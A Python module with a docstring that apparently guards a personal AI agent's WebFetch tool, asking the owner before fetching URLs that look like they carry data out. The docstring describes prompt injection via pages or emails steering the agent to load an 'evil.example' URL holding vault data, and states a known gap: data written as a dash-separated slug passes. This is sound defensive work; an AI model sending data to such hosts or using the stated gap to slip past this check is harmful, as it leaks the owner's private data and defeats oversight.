"""WebFetch check: a fetch whose URL looks like it is carrying data out asks first (Nov 8).

Why: in the bridge (Telegram, the check-in app) WebFetch ran without a tap, so an injected
instruction in a page or an email could have the agent load `evil.example/?d=<something from
the vault>`. The owner did not want a tap per new site ("But do i need to approve then every time
they are doing something?"), so this asks only for the shape of exfiltration, not for new sites:

  ask    one value that reads as free text longer than TEXT_MAX (has spaces); any path segment
         or query value longer than SEG_MAX; a whole query longer than QUERY_MAX; an
         encoded-looking run (40+ letters and digits, mixed case, no - or _) on a site that is
         not a big platform
  allow  everything else, and every URL on PLATFORMS (an id in a Google Doc or Amazon URL is
         an id, and the request cannot reach a stranger's server)

Replayed on Nov 8 against every past WebFetch on vault-host and the Mac (925 unique URLs): none
asks. Against simulated leaks it catches plain text, base64 in a query or path, and an encoded
key. Known gap, by decision: data written as a dash-separated slug
(`evil.example/owner-passport-x1234567`) looks like an article URL and passes.

Applies to the main conversation and every sub-agent: "WebFetch" is an ask rule in
agent.ASK_RULES, so each fetch reaches can_use_tool even under bypassPermissions (verified on
the box, CLI 2.1.319). WebSearch is not affected.
"""
from __future__ import annotations

import re
from urllib.parse import parse_qsl, unquote, urlparse

PLATFORMS = ("google.com", "amazon.com", "github.com", "githubusercontent.com", "stanford.edu",
             "wikipedia.org", "youtube.com", "microsoft.com", "apple.com", "archive.org",
             "researchgate.net", "arxiv.org", "medium.com", "linkedin.com", "notion.so")
TEXT_MAX = 60
SEG_MAX = 160
QUERY_MAX = 300
_BLOB = re.compile(r"[A-Za-z0-9+/=]{40,}")


def _host(u) -> str:
    h = (u.hostname or "").lower().rstrip(".")
    return h[4:] if h.startswith("www.") else h


def _platform(host: str) -> bool:
    return any(host == p or host.endswith("." + p) for p in PLATFORMS)


def _blob(tok: str) -> str | None:
    for m in _BLOB.finditer(tok):
        s = m.group(0)
        if all(re.search(p, s) for p in (r"[a-z]", r"[A-Z]", r"[0-9]")):
            return s
    return None


def check(url: str) -> str:
    """"" if the fetch may run; otherwise why it asks."""
    try:
        u = urlparse(str(url or ""))
        host = _host(u)
    except ValueError:
        return "the URL cannot be read"
    if _platform(host):
        return ""
    query = unquote(u.query or "")
    if len(query) > QUERY_MAX:
        return f"its query is {len(query)} characters long"
    values = [v for _, v in parse_qsl(u.query or "", keep_blank_values=True)]
    parts = [unquote(p) for p in (u.path or "").split("/") if p] + values
    for p in parts:
        if len(p) > SEG_MAX:
            return f"one part of it is {len(p)} characters long"
    for p in parts:
        if " " in p.strip() and len(p) > TEXT_MAX:
            return f"it carries {len(p)} characters of text"
        b = _blob(p)
        if b:
            return f"it carries a {len(b)}-character encoded-looking string"
    return ""
